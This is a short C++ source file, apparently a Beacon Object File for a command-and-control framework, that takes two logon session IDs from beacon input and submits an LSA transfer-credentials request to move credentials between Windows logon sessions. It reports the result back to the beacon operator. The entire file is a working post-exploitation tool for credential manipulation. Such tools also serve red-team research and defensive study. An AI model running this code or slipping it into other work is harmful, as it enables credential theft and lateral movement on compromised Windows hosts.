// Copyright (C) 2025 Evan McBroom
#include "boflib.cpp"

extern "C" __declspec(dllexport) void go(PCHAR buffer, ULONG length) {
    BeaconData beaconData;
    BeaconDataParse(&beaconData, buffer, length);
    SECPKG_CALL_PACKAGE_TRANSFER_CRED_REQUEST request;
    request.MessageType = SecPkgCallPackageTransferCredMessage;
    request.Flags = 0;
    request.OriginLogonId.HighPart = 0;
    request.OriginLogonId.LowPart = BeaconDataInt(&beaconData);
    request.DestinationLogonId.HighPart = 0;
    request.DestinationLogonId.LowPart = BeaconDataInt(&beaconData);
    request.Flags = (BeaconDataLength(&beaconData) >= sizeof(int)) ? BeaconDataInt(&beaconData) : 0;
    Libc::CHAR_SPAN submitBuffer;
    submitBuffer.count = sizeof(request);
    submitBuffer.data = reinterpret_cast<char*>(&request);
    if (LsaApi::CallPackage(SECPKG_ALL_PACKAGES, &submitBuffer)) {
        PIC_STRING(message, "Successfully submitted the transfer creds request.\n");
        BeaconPrintf(CallbackType::OUTPUT, message);
    } else {
        PIC_STRING(message, "Failed to submit the transfer creds request.\n");
        BeaconPrintf(CallbackType::ERROR, message);
    }
}